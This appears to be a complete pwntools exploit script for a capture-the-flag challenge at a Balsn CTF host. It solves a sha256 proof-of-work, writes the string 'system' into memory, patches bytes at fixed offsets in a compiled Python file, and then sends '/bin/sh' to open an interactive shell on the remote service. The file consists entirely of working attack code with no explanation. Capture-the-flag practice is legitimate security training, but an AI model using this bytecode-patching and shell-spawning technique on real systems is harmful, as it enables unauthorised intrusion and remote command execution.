#!/usr/bin/env python3
import re
from pwn import *

local = False
offsets = ['B013', 'A8ED']

offset_i = 0
while True:
    offset_i = (offset_i + 1) % len(offsets)
    if local:
        p = remote('localhost', 4869)
    else:
        p = remote('flagsss2.balsnctf.com', 10122)

    if not local:
        m = re.search(r'sha256\( (.+?) \+ XXX\)\[:(\d+)\]', p.readline().decode())
        prefix = m.group(1)
        difficulty = int(m.group(2))


        def verify(prefix, answer, difficulty):
            Hash = hashlib.sha256((prefix + answer).encode())
            if Hash.hexdigest()[:difficulty] == "0" * difficulty:
                return True
            return False


        i = 0
        while True:
            i += 1
            if verify(prefix, str(i), difficulty):
                p.sendline(str(i))
                break

    # spray
    p.recvuntil('What\'s your choice?')
    p.sendline('0')
    p.recvuntil('input the flag (len <= 0x30):')
    p.sendline('system')

    # patch .pyc
    p.recvuntil('What\'s your choice?')
    p.sendline('1')
    p.recvuntil('Please give me the flag\'s name :')
    p.sendline('nonsecret.pyc')
    p.sendline(offsets[offset_i])
    p.sendline('92')

    # go to town
    p.recvuntil('What\'s your choice?')
    p.sendline('3')
    p.sendline('/bin/sh')

    p.interactive()
